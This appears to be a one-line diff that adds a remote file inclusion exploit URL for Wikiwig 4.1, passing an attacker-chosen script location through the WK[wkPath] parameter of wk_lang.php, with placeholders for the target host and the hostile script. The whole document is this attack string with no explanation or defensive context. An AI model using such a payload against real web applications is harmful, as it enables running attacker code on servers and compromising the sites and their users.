@@ -1,0 +1,1 @@
+http://www.example.com/[wikiwig-V4.1]/_wk/wk_lang.php?WK[wkPath]=[evil_scripts]
